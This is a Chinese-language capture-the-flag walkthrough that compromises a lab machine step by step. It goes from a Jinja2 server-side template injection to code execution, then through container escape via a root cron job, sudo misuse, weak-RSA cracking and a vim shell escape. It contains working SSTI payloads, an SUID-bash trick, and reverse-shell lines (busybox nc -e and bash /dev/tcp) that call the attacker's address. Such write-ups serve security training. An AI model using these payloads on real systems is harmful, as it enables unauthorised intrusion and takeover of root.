# **一、信息收集**

## **1. 主机发现与端口扫描**

首先使用 `arp-scan` 在本地网络中确定目标主机的IP地址，随后利用 `nmap` 对其进行全端口扫描，以识别开放的服务。

**主机发现:**

```bash
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -l
...
192.168.205.131 08:00:27:77:f8:3a     PCS Systemtechnik GmbH
...
```

**端口扫描:**

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p- 192.168.205.131
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
...
```

扫描结果显示，目标主机IP为 `192.168.205.131`，开放了 **22 (SSH)** 和 **80 (HTTP)** 端口。

## **2. Web服务侦察**

访问 `http://192.168.205.131`，服务器返回301重定向，指向域名 `http://shieldweb.che/`。

将域名与IP地址绑定到 `/etc/hosts` 文件后，进行子域名爆破，发现一个重要的子域名 `ticket.shieldweb.che`。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo vim /etc/hosts
# 添加以下行
192.168.205.131 shieldweb.che ticket.shieldweb.che

┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ wfuzz -c -u "http://shieldweb.che" -H "HOST:FUZZ.shieldweb.che" -w /path/to/wordlist.txt --hw 11
...
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                          
=====================================================================
000000453:   200        94 L     180 W      2129 Ch     "ticket - ticket"
...
```

再次访问 `http://ticket.shieldweb.che`，发现一个联系表单页面。目录扫描显示存在 `/submit` 路径。

# **二、漏洞发现与初始访问**

## **1. SSTI (服务器端模板注入)**

在联系表单的 `name` 字段中输入 `{{7*7}}` 并提交到 `/submit` 端点，返回结果中显示了 `49`。这证实了该表单存在 **Jinja2 服务器端模板注入 (SSTI)** 漏洞。

**漏洞验证:**

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://ticket.shieldweb.che/submit -X POST -d 'name={{7*7}}&email=a&message=a'
...
<div class="response success">
    Thank you for your message, 49!
</div>
...
```

## **2. SSTI 到 RCE**

利用SSTI漏洞，构造Payload以执行远程代码。通过遍历Python对象，可以调用 `os.popen` 来执行系统命令。

**执行 `id` 命令:**

```bash
# Payload: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://ticket.shieldweb.che/submit -X POST -d 'name=%7B%7B%20self.__init__.__globals__.__builtins__.__import__%28%27os%27%29.popen%28%27id%27%29.read%28%29%20%7D%7D&email=1&message=1'
...

<div class="response success">
    Thank you for your message, uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
!
</div>

...
```

命令成功以 `root` 用户身份在一个容器内执行。

## **3. 获取反弹Shell (Docker内)**

构造反弹Shell的Payload，在本地Kali开启监听，成功获取一个Docker容器内的 `root` 权限Shell。

**本地监听:**

```bash
nc -lvnp 8888
```

**执行反弹Shell Payload:**（去web执行，不然会有**shell 解析问题**）

```bash
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('busybox nc 192.168.205.128 8888 -e $(which $(echo $0)) ').read() }}
```

**稳定shell：**

```bash
python -c 'import pty; pty.spawn("ash")'
Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=ash
stty rows 24 columns 80
```

# **三、权限提升**

## **1. 容器逃逸 (Docker -> love)**

在获得的Docker Shell中进行信息收集，发现 `/var/log/access.yml` 文件中记录了一条可疑的 `cron` 计划任务。

```bash
/var/log # cat access.yml
...
2023-08-31 22:45:00 - Usuario: A.love - Accion: Tarea cron ejecutada: */5 * * * * root bash /home/love/script/*
...
```

该任务每5分钟以 `root` 权限执行 `/home/love/script/` 目录下的所有脚本。通过 `linpeas.sh` 等工具或手动 `mount` 检查，发现宿主机的 `/home/love/script` 被挂载到了容器的 `/script` 目录，并且该目录可写。这是一个典型的容器逃逸路径。

1. 在容器的 `/script` 目录下创建一个反弹Shell脚本。

   ```bash
   /script # echo 'bash -c "/bin/bash -i >& /dev/tcp/192.168.205.128/8888 0>&1"' > 
   a.sh
   /script # chmod +x a.sh 
   ```

2. 在本地Kali开启 `8888` 端口监听。等待cron任务执行后，成功接收到宿主机 `love` 用户的Shell。

## **2. love -> mitnick**

在 `love` 用户的Shell中，执行 `sudo -l` 发现其可以免密以 `mitnick` 用户身份运行一个名为 `sas` 的程序。

```bash
love@osiris:~$ sudo -l
...
User love may run the following commands on osiris:
    (mitnick) NOPASSWD: /home/mitnick/sas
```

运行 `/home/mitnick/sas` 后进入一个受限的自定义shell。该shell内置了 `run` 命令，可以执行外部脚本。

1. 在 `/tmp` 目录创建一个脚本，用于复制 `/bin/bash` 并为其赋予SUID权限。

   ```bash
   love@osiris:/tmp$ echo 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh' > a.sh
   love@osiris:/tmp$ chmod +x a.sh
   ```

2. 通过 `sas` shell执行该脚本。

   ```bash
   love@osiris:~$ sudo -u mitnick /home/mitnick/sas
   # run /tmp/a.sh
   ```

3. 执行 `/tmp/sh -p`，成功获得 `mitnick` 用户的有效权限。

## **3. mitnick -> tomu**

在 `mitnick` 用户的家目录下，发现一个公钥文件 `publickey.pub` 和一个加密文件 `secret.enc`。通过查看`publickey.pub`可以发现这是一个非常短的 RSA 公钥，长度只有 **512 位**，这意味着**可以用 RSA 因数分解攻击直接爆破私钥**。

1. 将这两个文件传输到本地Kali攻击机。

2. 使用 `RsaCtfTool` 工具，利用公钥来解密文件。

   ```bash
   ┌──(kali㉿kali)-[~]
   └─$ RsaCtfTool --publickey publickey.pub --decryptfile secret.enc --private
   ...
   utf-8 : sh1m0mur4Bl4ckh4t
   ...
   ```

3. 成功解密出密码：`sh1m0mur4Bl4ckh4t`。

4. 在 `/home` 目录下发现另一用户 `tomu`。使用刚解出的密码成功切换到 `tomu` 用户。

## **4. tomu -> root**

在 `tomu` 用户的Shell中，再次执行 `sudo -l`，发现可以免密以 `root` 身份运行 `/opt/Contempt/Contempt`。

```bash
tomu@osiris:~$ sudo -l
...
User tomu may run the following commands on osiris:
    (root) /opt/Contempt/Contempt
```

执行该程序后，出现一个菜单。选择 `2` (Ayuda) 会使用 `vim` 打开帮助文档。`vim` 在以`sudo`权限运行时，可以通过内部命令逃逸到shell。

1. 执行提权命令。

   ```bash
   tomu@osiris:~$ sudo /opt/Contempt/Contempt
   ```

2. 在程序菜单中选择 `2`，进入 `vim` 界面。

3. 在 `vim` 命令模式下，输入 `!bash` 或 `!sh` 并回车。

   ```vim
   :!bash
   ```

4. 成功获取 `root` 权限的交互式Shell。

**最终在 `/root` 和 `/home/tomu` 目录下找到flag。**

```bash
root@osiris:~# cat /root/root.sh
...
flag --> 1e271c5ce97e76ae8417a95c74085fba
...
root@osiris:~# cat /home/tomu/user.txt
612701a03669485d94bc687449fdab39
```